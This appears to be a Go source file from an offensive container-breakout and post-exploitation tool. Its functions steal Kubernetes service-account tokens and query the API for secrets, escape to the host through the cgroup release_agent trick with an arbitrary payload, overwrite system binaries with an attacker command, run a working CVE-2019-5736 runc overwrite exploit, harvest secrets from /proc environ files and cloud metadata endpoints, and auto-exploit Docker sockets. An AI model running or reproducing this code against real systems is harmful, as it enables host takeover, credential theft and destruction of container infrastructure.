package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
)

func idenitfyVerifyK8Secrets() {
	fmt.Println("[*] Identifying and Verifying K8's Secrets")

	paths := make([]string, 2)
	var tokens []string

	paths[0] = "/var/run/secrets/kubernetes.io/serviceaccount/token"
	paths[1] = "/run/secrets/kubernetes.io/serviceaccount/token"

	for _, path := range paths {
		if fileExists(path) {
			if *verbosePtr {
				fmt.Println("[*] File exists: ", path)
			}

			data, err := ioutil.ReadFile(path)
			if err != nil {
				fmt.Println("[ERROR]", err)
				return
			}
			fmt.Println("[!] Token found at:", path)
			tokens = append(tokens, string(data))
		}
	}

	urls := make([]string, 4)
	urls[0] = "https://kubernetes.default/api/v1"
	urls[1] = "https://kubernetes.default/api/v1/namespaces"
	urls[2] = "https://kubernetes.default/api/v1/namespaces/default/secrets"
	urls[3] = "https://kubernetes.default/api/v1/namespaces/default/pods"

	for _, token := range tokens {
		for _, url := range urls {
			fmt.Println("[*] Trying: ", url)
			rspCode, err := httpRequestBearer(url, token)
			if err != nil {
				fmt.Println("[ERROR]", err)
			}
			if rspCode >= 200 && rspCode < 400 {
				fmt.Printf("[!] Valid response with token (%s...)on -> %s\n", token[:10], url)
			}
		}
	}
}

func abuseCgroupPriv(payload string) {
	if payload == "nil" {
		fmt.Println("[-] Please provide a payload")
		return
	}
	fmt.Println("[+] Attempting to abuse CGROUP Privileges")
	if *verbosePtr {
		fmt.Println("[*] Extracting Container Home: sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab")
	}

	//Locate where the container is located on the underlying host
	containerHome, err := execShellCmd("sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab")
	if err != nil {
		fmt.Println("[ERROR] Extracting Container Home  -> 'sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab'. ", err)
	}

	containerHome = strings.TrimSpace(containerHome)
	if *verbosePtr {
		fmt.Println("[*] Container Home Extracted: ", containerHome)
	}

	//Generate where the cgroup directories will live
	randomCgroupPath := generateRandomString(6)
	randomCgroupChild := generateRandomString(6)

	//This satisfies this command essentially "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x"
	cgroupFullPath := fmt.Sprintf("/etc/cgrp%s/%s", randomCgroupPath, randomCgroupChild)
	cgroupPartialPath := fmt.Sprintf("/etc/cgrp%s", randomCgroupPath)

	cgroupController := "memory"

	if *verbosePtr {
		fmt.Println("[*] CGROUP Location: ", cgroupFullPath)
	}
	out, err := execShellCmd("mkdir " + cgroupPartialPath)

	if err != nil {
		fmt.Println("[ERROR] In Created Cgroup folder -> 'mkdir "+cgroupPartialPath+"'.", err, out)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Created Cgroup folder:", cgroupPartialPath)
	}

	//mount -t cgroup -o rdma cgroup /tmp/cgrp
	// "mount -t cgroup -o " + cgroupController + " cgroup " + cgroupPartialPath
	mountCmd := fmt.Sprintf("mount -t cgroup -o %s cgroup %s", cgroupController, cgroupPartialPath)
	_, err = execShellCmd(mountCmd)

	if err != nil {
		fmt.Println("[INFO] CGROUP may exist, attempting exploit regardless")
		fmt.Printf("[ERROR] In Mounted CGROUP controller -> '%s'.%s\n", mountCmd, err)
		// exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Mounted CGROUP controller: ", mountCmd)
	}

	// Create a folder for the child cgroup i.e mkdir /tmp/cgrp/x
	_, err = execShellCmd("mkdir " + cgroupFullPath)

	if err != nil {
		fmt.Println("[ERROR] In Created Child CGROUP folder -> 'mkdir "+cgroupFullPath+"'.", err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Created Child CGROUP folder:", cgroupPartialPath)
	}

	// echo 1 > /tmp/cgrp/x/notify_on_release
	notifyOnReleaseCmd := fmt.Sprintf("echo 1 > %s/notify_on_release", cgroupFullPath)
	_, err = execShellCmd(notifyOnReleaseCmd)

	if err != nil {
		fmt.Println("[ERROR] In Enabling CGROUP Notifications -> 'echo 1 > "+cgroupFullPath+"/notify_on_release'. ", err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Enabled CGROUP Notifications:", notifyOnReleaseCmd)
	}

	// echo "$host_path/cmd" > /tmp/cgrp/release_agent
	releaseAgentCommand := "echo " + containerHome + "/cmd > " + cgroupPartialPath + "/release_agent"
	_, err = execShellCmd(releaseAgentCommand)

	if err != nil {
		fmt.Println("[ERROR] In Created CMD Script -> '"+releaseAgentCommand+"'. ", err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Created CMD Script:", releaseAgentCommand)
	}

	_, err = execShellCmd("echo '#!/bin/sh' > /cmd")

	if err != nil {
		fmt.Println("[ERROR] In Inserted shebang into CMD Script -> 'echo '#!/bin/sh' > /cmd'. ", err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Inserted shebang into CMD Script: echo '#!/bin/sh' > /cmd")
	}

	payloadString := fmt.Sprintf("echo '%s > %s/output'>> /cmd", payload, containerHome)

	if *verbosePtr {
		fmt.Println("[*] Payload provided: ", payload)
	}

	_, err = execShellCmd(payloadString)

	if err != nil {
		fmt.Println("[ERROR] In Inserted payload into CMD script -> '"+payloadString+"'. ", err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Inserted payload into CMD script: ", payloadString)
	}

	_, err = execShellCmd("chmod a+x /cmd")

	if err != nil {
		fmt.Println("[ERROR] In -> 'chmod a+x /cmd'. ", err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] chmod'ing cmd script: chmod a+x /cmd")
	}

	// "echo $$ > " + cgroupFullPath + "/cgroup.procs"
	addAndExecuteCmd := fmt.Sprintf("echo $$ > %s/cgroup.procs", cgroupFullPath)
	_, err = execShellCmd(addAndExecuteCmd)

	if err != nil {
		fmt.Printf("[ERROR] In  Executing, adding a process to CGROUP-> %s, %s\n", addAndExecuteCmd, err)
		exitCode = 1
		return
	}

	if *verbosePtr {
		fmt.Println("[*] Executing, adding a process to CGROUP: ", addAndExecuteCmd)
	}

	fmt.Println("[*] The result of your command can be found in /output")
}

func scrapeMetadataEndpoints(endpointList string) {

	if endpointList != "nil" {
		endpoints, err := getLinesFromFile(endpointList)
		if err != nil {
			log.Fatal(err)
		}

		for _, target := range endpoints {
			u, err := url.Parse(target)
			if err != nil {
				log.Fatal(err)
			}
			hostport := u.Port()
			if len(hostport) == 0 {
				hostport = "80"
			}

			resp, err := scrapeGcpMetadata(u.Hostname(), hostport)
			if err != nil {
				fmt.Println("[ERROR] ", err)
			} else {
				fmt.Println("[*] Output-> \n", resp)
				exitCode = 1
			}
		}

	} else {
		resp, err := scrapeGcpMetadata("169.254.169.254", "80")
		if err != nil {
			fmt.Println("[ERROR] ", err)
		} else {
			fmt.Println("[*] Output-> \n", resp)
			exitCode = 1
		}

		resp, err = scrapeGcpMetadata("169.254.169.254", "8080")
		if err != nil {
			fmt.Println("[ERROR] ", err)
		} else {
			fmt.Println("[*] Output-> \n", resp)
			exitCode = 1
		}
	}

}

func findDockerD() {
	fmt.Println("[+] Looking for Dockerd")
	dockerdVal, checkResult := checkForDockerEnvSock()
	if checkResult {
		fmt.Println("[!] Dockerd DOCKER_HOST found:", dockerdVal)
		exitCode = 1
	}
	sockets, _ := getValidSockets(*pathPtr)
	httpSockets := getHTTPEnabledSockets(sockets)
	dockerSocks := getDockerEnabledSockets(httpSockets)
	for _, aSock := range dockerSocks {
		fmt.Println("[!] Valid Docker Socket:", aSock)
		exitCode = 1
	}
}

func findHttpSockets(path string) {
	fmt.Println("[+] Looking for HTTP enabled Sockets from:", path)
	sockets, _ := getValidSockets(path)
	httpSockets := getHTTPEnabledSockets(sockets)
	for _, aSock := range httpSockets {
		fmt.Println("[!] Valid HTTP Socket:", aSock)
		exitCode = 1
	}
}

func hijackBinaries(hijackCommand string) {

	if hijackCommand != "nil" {
		fmt.Println("[!] WARNING THIS WILL PROBABLY BREAK THE CONTAINER BUT YOU MAY GET SHELLZ...")
		fmt.Println("[+] Attempting to hijack binaries")
		fmt.Println("[*] Command to be used: ", hijackCommand)
		command := fmt.Sprintf("#!/bin/sh \n %s \n", hijackCommand)

		hijackDirectory("/bin", command)
		hijackDirectory("/sbin", command)
		hijackDirectory("/usr/bin", command)
		hijackDirectory("/usr/sbin", command)
	} else {
		fmt.Println("[-] Please provide a payload")
	}
}

func runcPwn(hijackCommand string) {

	if hijackCommand == "nil" {
		fmt.Println("[-] Please provide a payload")
		return
	}

	//This code has been pretty much copy+pasted from the great work done by Nick Frichetten
	//https://github.com/Frichetten/CVE-2019-5736-PoC
	fmt.Println("[!] WARNING THIS OPTION IS NOT CICD FRIENDLY, THIS WILL PROBABLY BREAK THE CONTAINER RUNTIME BUT YOU MIGHT GET SHELLZ...")
	payload := fmt.Sprintf("#!/bin/bash \n %s", hijackCommand)
	fmt.Println("[+] Attempting to exploit CVE-2019-5736 with command: ", hijackCommand)
	fd, err := os.Create("/bin/sh")
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintln(fd, "#!/proc/self/exe")
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("[+] This process will exit IF an EXECVE is called in the Container or if the Container is manually stopped")

	var found int
	for found == 0 {
		pids, err := ioutil.ReadDir("/proc")
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
			fstring := string(fbytes)
			if strings.Contains(fstring, "runc") {
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}
	var handleFd = -1
	for handleFd == -1 {
		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
		if int(handle.Fd()) > 0 {
			handleFd = int(handle.Fd())
		}
	}
	for {
		writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) > 0 {
			writeHandle.Write([]byte(payload))
			return
		}
	}
}

func checkProcEnviron(wordlist string) {
	fmt.Println("[+] Searching /proc/* for data")
	files, err := ioutil.ReadDir("/proc")
	if err != nil {
		fmt.Println("[ERROR], Could not access ProcFS")
		return
	}

	var terms []string
	if wordlist != "nil" {
		terms, err = getLinesFromFile(wordlist)
		if err != nil {
			panic(err)
		}
	} else {
		terms = append(terms, "secret", "password")
	}

	for _, file := range files {
		environFile := "/proc/" + file.Name() + "/environ"
		_, err := os.Stat(environFile)
		if err != nil {
			if *verbosePtr {
				fmt.Println("[ERROR] file does not exist-> ", environFile)
			}
		} else {
			cmd := "cat " + environFile
			output, err := execShellCmd(cmd)
			if err != nil {
				if *verbosePtr {
					fmt.Println("[ERROR] Could not query environ for-> ", environFile)
				}
			}
			if checkForJuicyDeets(wordlist, output, terms) {
				fmt.Printf("[!] Sensitive keyword found in: %s -> '%s'\n", environFile, output)
				exitCode = 2
			}
		}
	}
}

func checkEnvVars(wordlist string) {
	fmt.Println("[+] Checking ENV Variables for secrets")
	var terms []string
	var err error
	if wordlist != "nil" {
		terms, err = getLinesFromFile(wordlist)
		if err != nil {
			panic(err)
		}
	} else {
		terms = append(terms, "secret", "password")
	}

	for _, envVar := range os.Environ() {
		if checkForJuicyDeets(wordlist, envVar, terms) {
			fmt.Println("[!] Sensitive Keyword found in ENV: ", envVar)
			exitCode = 2
		}
	}

}
func checkMetadataServices(endpointList string) {
	if endpointList != "nil" {
		endpoints, err := getLinesFromFile(endpointList)
		if err != nil {
			log.Fatal(err)
		}

		for _, endpoint := range endpoints {
			if queryEndpoint(endpoint) {
				exitCode = 1
			}
		}

	} else {

		if queryEndpoint("http://169.254.169.254:8080/") {
			exitCode = 1
		}

		if *verbosePtr {
			fmt.Println("[*] Attempting to query GCP, Azure, Amazon and Digital Ocean")
		}
		if queryEndpoint("http://169.254.169.254/") {
			exitCode = 1
		}

		if *verbosePtr {
			fmt.Println("[*] Attempting to query GCP")
		}
		if queryEndpoint("http://metadata.google.internal/") {
			exitCode = 1
		}

		if *verbosePtr {
			fmt.Println("[*] Attempting to query Alibaba Cloud")
		}
		if queryEndpoint("http://100.100.100.200/") {
			exitCode = 1
		}

		if *verbosePtr {
			fmt.Println("[*] Attempting to query Kubernetes")
		}
		if queryEndpoint("https://kubernetes.default") {
			exitCode = 1
		}

	}
}
func autopwn(path string, cicd bool) {
	fmt.Println("[+] Attempting to autopwn")
	sockets, _ := getValidSockets(path)
	httpSockets := getHTTPEnabledSockets(sockets)
	dockerSocks := getDockerEnabledSockets(httpSockets)
	for _, element := range dockerSocks {
		err := autopwnDocker(element, cicd)
		if err != nil {
			fmt.Println("[ERROR] ", err)
		}
	}
}

func reverseDNS(cidr string) {
	fmt.Println("[*] Attempting to performd reverse DNS lookups:", cidr)
	ip, subnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return
	}
	split := strings.Split(cidr, "/")
	bits, err := strconv.Atoi(split[1])
	if err != nil {
		return
	}
	size := int(math.Exp2(float64(32 - bits)))
	if size > 2 {
		for i := 0; i < size; i++ {
			if i > 0 && i < size-1 {
				ip = net.IPv4(subnet.IP[0]|byte((i>>24)&0xff),
					subnet.IP[1]|byte((i>>16)&0xff),
					subnet.IP[2]|byte((i>>8)&0xff),
					subnet.IP[3]|byte((i>>0)&0xff))
				reverse, _ := net.LookupAddr(ip.String())
				if reverse != nil {
					fmt.Printf("[!] %s DNS entry: %s\n", ip.String(), strings.Join(reverse[:], ", "))
				}
			}
		}
	}
}
